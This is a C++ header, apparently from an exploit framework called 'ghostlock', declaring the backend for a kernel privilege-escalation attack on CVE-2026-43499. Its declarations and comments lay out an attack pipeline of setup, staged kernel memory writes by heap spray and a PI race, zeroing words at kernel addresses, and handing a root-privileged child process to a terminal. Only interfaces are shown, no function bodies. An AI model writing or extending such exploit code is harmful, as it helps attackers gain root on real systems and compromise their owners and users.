#ifndef GHOSTLOCK_CVE2026_43499_BACKEND_HPP
#define GHOSTLOCK_CVE2026_43499_BACKEND_HPP

#include "memory/payload_builder.h"
#include "profile/model.h"
#include "pipeline/backend_policy.hpp"
#include "pipeline/component_catalog.hpp"
#include "session/core_session.hpp"
#include "session/stage_types.hpp"
#include "support/status.hpp"
#include "terminal/rooted_child.hpp"

namespace ghostlock::backend {
    using ghostlock::session::CoreSession;
    using ghostlock::session::StageResult;
    using ghostlock::session::VictimChain;
    /* Batch 4 (D1=B) cve_2026_43499 backend: the setup stage plus the W1/W2/W3
     * step sequence. The sequence is owned by this backend, and the middleware
     * policy is a template parameter: every route hook (W2 repairs) and
     * capability (multicast / w3_exact_target) comes from
     * `Middleware`, so each catalogued middleware instantiates its own backend
     * code and produces a different pipeline by construction. Statement order
     * and log text are the pre-Batch-4 sequence, unchanged.
     *
     * The template definitions live in the unit with explicit instantiations
     * for the catalogued middleware policies; callers only include this header. */
    struct Cve2026_43499Policy final {
        static constexpr pipeline::BackendKind kind = pipeline::BackendKind::Cve2026_43499;

        /* setup -> W1 -> W2/W3 chain, then hand the rooted child to the terminal
         * (see pipeline::Pipeline::run). Route comes from the profile and is
         * dispatched internally; on Continue `out` receives the transfer. */
        [[nodiscard]] static StageResult run(CoreSession &session,
                                             const profile::kernel_offsets &decoded,
                                             const char *debug_dir, bool force_attack,
                                             ghostlock::terminal::RootedChild &out);

        /* One route's W1/W2/W3 sequence; the route policy is the template.
         * Public so the explicit instantiations stay in the unit. */
        template <class Middleware>
        [[nodiscard]] static StageResult run_steps(CoreSession &session,
                                                   const profile::kernel_offsets &decoded,
                                                   const char *debug_dir, bool force_attack,
                                                   VictimChain &chain);

        /* One route write: middleware resident fast path, else heap spray + PI
         * race. Public because the attack-function disassembly gate compares it
         * by symbol (cmp_disasm "do_one_write"). */
        template <class Middleware>
        [[nodiscard]] static Status attack_write(CoreSession &session,
                                                 const memory::WriteRequest &request,
                                                 const char *desc);

        /* Ancillary-context adapter: zero one word at an already-translated
         * kernel address through this middleware's write. Behaviors receive it
         * as a plain function pointer so they never name the middleware. */
        template <class Middleware>
        [[nodiscard]] static Status zero_word(uintptr_t target, const char *desc);

        /* Stage: process setup and profile installation (middleware-free). */
        [[nodiscard]] static StageResult run_setup(CoreSession &session,
                                                   const profile::kernel_offsets &decoded,
                                                   const char *debug_dir, bool force_attack);
    };

    /* Availability is owned by component_catalog::backend_available(); the
     * execution policy carries only the id. The declared identity and this
     * policy must name the same backend. */
    static_assert(Cve2026_43499Policy::kind == pipeline::backend::Cve2026_43499::kind);
    static_assert(pipeline::backend_available(Cve2026_43499Policy::kind));
} // namespace ghostlock::backend

#endif
